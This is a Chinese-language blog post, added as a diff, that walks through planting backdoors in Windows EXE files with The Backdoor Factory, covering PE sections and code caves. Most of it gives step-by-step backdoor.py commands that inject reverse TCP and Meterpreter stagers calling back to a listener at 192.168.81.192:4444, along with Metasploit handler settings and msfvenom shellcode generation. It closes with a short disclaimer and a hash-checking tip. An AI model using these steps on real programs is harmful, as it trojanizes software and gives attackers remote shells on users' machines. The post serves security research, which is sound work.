@@ -1,0 +1,406 @@
+<article class="post">
+  <h1>利用BDF向EXE文件植入后门</h1>
+
+  <div class="entry">
+    <h2 id="0x00-前言">0x00 前言</h2>
+<hr>
+<p><code class="language-plaintext highlighter-rouge">The Backdoor Factory</code>可用来向可执行文件植入后门，修改程序执行流程，执行添加的payload。</p>
+
+<p>本文将要介绍向EXE文件植入后门的原理，测试<code class="language-plaintext highlighter-rouge">The Backdoor Factory</code>植入后门的方法，分析细节，总结思路。</p>
+
+<p>The Backdoor Factory下载地址：</p>
+
+<p>https://github.com/secretsquirrel/the-backdoor-factory</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr>
+
+<p>本文将要介绍如下内容：</p>
+
+<ul>
+  <li>EXE文件后门植入原理</li>
+  <li>实际测试The Backdoor Factory</li>
+  <li>分析The Backdoor Factory功能</li>
+</ul>
+
+<h2 id="0x02-基础知识">0x02 基础知识</h2>
+<hr>
+
+<p><strong>PE文件格式：</strong></p>
+
+<p>参考资料：</p>
+
+<p>https://en.wikibooks.org/wiki/X86_Disassembly/Windows_Executable_Files</p>
+
+<p><strong>Code Caves：</strong></p>
+
+<p>参考资料：</p>
+
+<p>https://www.codeproject.com/Articles/20240/The-Beginners-Guide-to-Codecaves</p>
+
+<p><strong>Code Caves的直观认识：</strong></p>
+
+<p>使用<code class="language-plaintext highlighter-rouge">vc6.0</code>生成exe文件，查看文件中可利用的Code Caves</p>
+
+<p>c代码：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include "stdafx.h"
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+int array[200]={1,2,3,4,5,6,7,8,9};
+char array2[200]="123456789ABCDEF";
+
+int main(int argc, char* argv[])
+{
+	printf("hello world");	
+	return 0;
+}
+</code></pre></div></div>
+
+<p>Release编译生成文件，使用Immunity Debugger打开</p>
+
+<p><code class="language-plaintext highlighter-rouge">View</code>-<code class="language-plaintext highlighter-rouge">Memory</code>(快捷键Alt+M)</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/0-1.png" alt="Alt text"></p>
+
+<p>hello.exe包含四个区段,分别为<code class="language-plaintext highlighter-rouge">PE header</code>、<code class="language-plaintext highlighter-rouge">.text</code>、<code class="language-plaintext highlighter-rouge">.rdata</code>和<code class="language-plaintext highlighter-rouge">.data</code></p>
+
+<p>查看hello.exe的<code class="language-plaintext highlighter-rouge">.data</code>段</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/0-2.png" alt="Alt text"></p>
+
+<p>发现大段的0x00数据，这些位置可被替换成payload</p>
+
+<h2 id="0x03-文件后门植入原理">0x03 文件后门植入原理</h2>
+<hr>
+
+<h3 id="植入原理">植入原理</h3>
+
+<p>修改程序的执行流程，跳转到Code Caves，执行payload，再返回至程序的正常流程</p>
+
+<p>需要注意的是程序默认只有<code class="language-plaintext highlighter-rouge">.text</code>段具有执行权限，如果将payload添加到其他段(如<code class="language-plaintext highlighter-rouge">.data</code>或<code class="language-plaintext highlighter-rouge">.rdata</code>)，需要将该段添加执行权限</p>
+
+<p><strong>注：</strong></p>
+
+<p>实际使用可通过跳转多个Code Caves拼凑执行payload</p>
+
+<h3 id="利用思路">利用思路</h3>
+
+<h4 id="1新加区段权限为可读可写可执行rwe">1、新加区段，权限为可读可写可执行(RWE)</h4>
+
+<p>可使用工具LordPE</p>
+
+<p>手动添加可参考资料：</p>
+
+<p>https://www.exploit-db.com/docs/42061.pdf</p>
+
+<p><strong>优点：</strong></p>
+
+<p>简单直接，不需要考虑文件Code Caves的大小</p>
+
+<p><strong>缺点：</strong></p>
+
+<p>增加文件长度</p>
+
+<h4 id="2使用code-caves">2、使用Code Caves</h4>
+
+<p>搜索已有区段，寻找是否存在可用的Code Caves，对于不可执行的区段，还需要添加可执行权限</p>
+
+<p><strong>优点：</strong></p>
+
+<p>不改变文件大小</p>
+
+<p><strong>缺点：</strong></p>
+
+<p>需要考虑Code Caves的大小是否满足payload长度</p>
+
+<h2 id="0x04-实际测试the-backdoor-factory">0x04 实际测试The Backdoor Factory</h2>
+<hr>
+
+<p>Kali 2.0默认集成<code class="language-plaintext highlighter-rouge">The Backdoor Factory</code>，路径为<code class="language-plaintext highlighter-rouge">usr/share/backdoor-factory</code></p>
+
+<p>测试系统选为<code class="language-plaintext highlighter-rouge">Kali 2.0</code></p>
+
+<p>为便于测试，测试exe代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+int array[200]={1,2,3,4,5,6,7,8,9};
+char array2[200]="123456789ABCDEF";
+
+int main(int argc, char* argv[])
+{
+	printf("hello world\n");	
+	system("PAUSE"); 
+	return 0;
+}
+</code></pre></div></div>
+
+<p>程序输出hello world后暂停</p>
+
+<p>下面挑选The Backdoor Factory中常见的功能进行介绍</p>
+
+<h3 id="1检查该文件是否适用于the-backdoor-factory">1、检查该文件是否适用于The Backdoor Factory</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./backdoor.py -f test.exe -S
+</code></pre></div></div>
+
+<p>输出如下:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] Checking if binary is supported
+[*] Gathering file info
+[*] Reading win32 entry instructions
+test.exe is supported.
+</code></pre></div></div>
+
+<h3 id="2获取该文件的可用payload">2、获取该文件的可用payload</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./backdoor.py -f test.exe -s show
+</code></pre></div></div>
+
+<p>输出如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/0-3.png" alt="Alt text"></p>
+
+<p>可用payload如下：</p>
+
+<ul>
+  <li>cave_miner_inline</li>
+  <li>iat_reverse_tcp_inline</li>
+  <li>iat_reverse_tcp_inline_threaded</li>
+  <li>iat_reverse_tcp_stager_threaded</li>
+  <li>iat_user_supplied_shellcode_threaded</li>
+  <li>meterpreter_reverse_https_threaded</li>
+  <li>reverse_shell_tcp_inline</li>
+  <li>reverse_tcp_stager_threaded</li>
+  <li>user_supplied_shellcode_threaded</li>
+</ul>
+
+<p><strong>名称解析：</strong></p>
+
+<p><strong>cave_miner_inline:</strong></p>
+
+<p>作为payload模板，长度为135，仅实现了控制流程跳转，不做其他操作，可用作自定义开发shellcode的模板</p>
+
+<p>反汇编的payload格式如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/0-4.png" alt="Alt text"></p>
+
+<p><strong>reverse_shell_tcp_inline：</strong></p>
+
+<p>对应meterpreter server：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+</code></pre></div></div>
+
+<p><strong>meterpreter_reverse_https_threaded：</strong></p>
+
+<p>对应meterpreter server：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+</code></pre></div></div>
+
+<p><strong>iat_reverse_tcp_inline中的iat：</strong></p>
+
+<p>iat为Import Address Table(导入地址表)的缩写，如果PE文件的IAT不包含API LoadLibraryA和GetProcAddress，直接执行payload <code class="language-plaintext highlighter-rouge">reverse_shell_tcp_inline</code>会失败，<code class="language-plaintext highlighter-rouge">iat_reverse_tcp_inline</code>增加了修复IAT的功能，避免执行失败</p>
+
+<p><strong>user_supplied_shellcode_threaded：</strong></p>
+
+<p>自定义payload，payload可通过msf生成</p>
+
+<h3 id="3搜索该文件可用的code-caves">3、搜索该文件可用的Code Caves</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./backdoor.py -f test.exe -c
+</code></pre></div></div>
+
+<p>如果payload长度为703，那么Code Caves需要满足长度大于703，参数如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./backdoor.py -f test.exe -c -l 703
+</code></pre></div></div>
+
+<p>输出如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/0-5.png" alt="Alt text"></p>
+
+<p>共找到三个可供利用的位置：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>No section
+-&gt;Begin Cave 0x240
+-&gt;End of Cave 0x1000
+Size of Cave (int) 3520
+**************************************************
+No section
+-&gt;Begin Cave 0x693a
+-&gt;End of Cave 0x700c
+Size of Cave (int) 1746
+**************************************************
+We have a winner: .data
+-&gt;Begin Cave 0x7051
+-&gt;End of Cave 0x7350
+Size of Cave (int) 767
+SizeOfRawData 0x1000
+PointerToRawData 0x7000
+End of Raw Data: 0x8000
+</code></pre></div></div>
+
+<p>输出的地址为相对虚拟地址(Relative Virtual Address)，即相对于文件头(基地址Image Base)的偏移地址</p>
+
+<p>在内存中的实际地址(虚拟地址Virtual Address)=Image Base+RVA</p>
+
+<p>ImageBase = 0x00400000</p>
+
+<p>使用Immunity Debugger查看内存结构，进行验证</p>
+
+<p>内存结构如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/0-6.png" alt="Alt text"></p>
+
+<p><strong>(1)</strong></p>
+
+<p>No section
+-&gt;Begin Cave 0x240
+-&gt;End of Cave 0x1000
+Size of Cave (int) 3520</p>
+
+<p>内存中实际地址为0x00400240-0x00401000，位于PE header中，默认权限为<code class="language-plaintext highlighter-rouge">R</code></p>
+
+<p>查看内存地址数据如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/0-7.png" alt="Alt text"></p>
+
+<p><strong>(2)</strong></p>
+
+<p>No section
+-&gt;Begin Cave 0x693a
+-&gt;End of Cave 0x700c
+Size of Cave (int) 1746</p>
+
+<p>内存中实际地址为0x0040693a-0x0040700c,位于.rdata段中，默认权限为<code class="language-plaintext highlighter-rouge">R</code></p>
+
+<p>查看内存地址数据如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/0-8.png" alt="Alt text"></p>
+
+<p><strong>(3)</strong></p>
+
+<p>We have a winner: .data
+-&gt;Begin Cave 0x7051
+-&gt;End of Cave 0x7350
+Size of Cave (int) 767</p>
+
+<p>内存中实际地址为0x00407051-0x00407350,位于.data段中，默认权限为<code class="language-plaintext highlighter-rouge">RW</code></p>
+
+<p>查看内存地址数据如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/0-9.png" alt="Alt text"></p>
+
+<p>可以看到，通过The Backdoor Factory找到的Code Caves均符合要求</p>
+
+<h3 id="4添加payload">4、添加payload</h3>
+
+<p>这里选用<code class="language-plaintext highlighter-rouge">reverse_tcp_stager_threaded</code>进行测试，payload长度为703</p>
+
+<p>Server：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+</code></pre></div></div>
+
+<h4 id="1-添加新区段保存payload">(1) 添加新区段，保存payload</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./backdoor.py -f test.exe -H 192.168.81.192 -P 4444 -s reverse_tcp_stager_threaded -a -o test1.exe
+</code></pre></div></div>
+
+<p>新区段名称为<code class="language-plaintext highlighter-rouge">.sdata</code>，权限为<code class="language-plaintext highlighter-rouge">RWE</code></p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/1-1.png" alt="Alt text"></p>
+
+<p>若指定新添加区段名称为aaa,参数如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./backdoor.py -f test.exe -H 192.168.81.192 -P 4444 -s reverse_tcp_stager_threaded -a -n aaa -o test1.exe
+</code></pre></div></div>
+
+<h4 id="2-payload保存到data段中">(2) payload保存到.data段中</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./backdoor.py -f test.exe -H 192.168.81.192 -P 4444 -s reverse_tcp_stager_threaded -o test2.exe
+</code></pre></div></div>
+
+<p>根据提示选择<code class="language-plaintext highlighter-rouge">.data</code>段</p>
+
+<p><code class="language-plaintext highlighter-rouge">.data</code>段权限更改为<code class="language-plaintext highlighter-rouge">RWE</code>，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/1-2.png" alt="Alt text"></p>
+
+<p>程序入口点添加跳转代码<code class="language-plaintext highlighter-rouge">JMP TEST2.00407055</code>，<code class="language-plaintext highlighter-rouge">0x00407055</code>保存添加的payload</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/1-3.png" alt="Alt text"></p>
+
+<h4 id="3-payload保存到其他段中">(3) payload保存到其他段中</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./backdoor.py -f test.exe -H 192.168.81.192 -P 4444 -s reverse_tcp_stager_threaded -o test3.exe
+</code></pre></div></div>
+
+<p>根据提示选择PE header，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/1-4.png" alt="Alt text"></p>
+
+<p>执行会报错，需要对其进行修复</p>
+
+<p>可使用工具<code class="language-plaintext highlighter-rouge">nasm_shell</code>将汇编代码转换为十六进制数据</p>
+
+<p>Kali2.0默认集成nasm_shell</p>
+
+<p>工具使用如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/1-5.png" alt="Alt text"></p>
+
+<h4 id="4-自定义payload">(4) 自定义payload</h4>
+
+<p>生成payload：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/messagebox -f raw &gt;msg.bin
+</code></pre></div></div>
+
+<p>添加payload：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./backdoor.py -f test.exe -s user_supplied_shellcode_threaded -U msg.bin -o test4.exe
+</code></pre></div></div>
+
+<p>测试如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/1-6.png" alt="Alt text"></p>
+
+<h2 id="0x05-小结">0x05 小结</h2>
+<hr>
+
+<p>本文介绍了使用<code class="language-plaintext highlighter-rouge">The Backdoor Factory</code>向EXE文件植入后门的方法，利用Code Caves能够不改变原文件的大小。</p>
+
+<p>当然，该利用方法已经被杀毒软件查杀，本文介绍的内容仅作技术研究。</p>
+
+<p>站在防御的角度，下载文件时需要多加注意，只从可信源下载程序，同时校验文件hash。</p>
+
+<hr>
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+
+  </div>
+
+  <div class="date">
+    Written on October 20, 2017
+  </div>
+
+  
+</article>
